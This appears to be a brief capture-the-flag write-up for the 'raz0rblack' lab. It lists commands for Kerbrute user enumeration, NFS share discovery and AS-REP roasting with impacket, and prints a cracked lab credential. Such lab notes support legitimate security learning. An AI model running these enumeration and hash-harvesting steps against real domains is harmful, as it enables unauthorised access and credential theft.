# Page

```bash
 ./kerbrute_linux_386 userenum  -d raz0rblack.thm --dc 10.10.241.105    users.txt 
```

<figure><img src="../../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

{% embed url="https://h3ckt0r.gitbook.io/0xsec/cheat-sheet/pentest_notes#port-111-rpcbind" %}

<figure><img src="../../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

```bash
showmount -e 10.10.241.105
```

<figure><img src="../../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

i open exel file i found users&#x20;

<figure><img src="../../../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

REP-REPOSTING

```
impacket-GetNPUsers raz0rblack.thm/ -dc-ip 10.10.194.110  -usersfile users.txt -format john -outputfile crackme.txt -no-pass -request
```

<figure><img src="../../../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

user cracked

<figure><img src="../../../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

<mark style="color:red;">**twilliams:roastpotatoes**</mark>

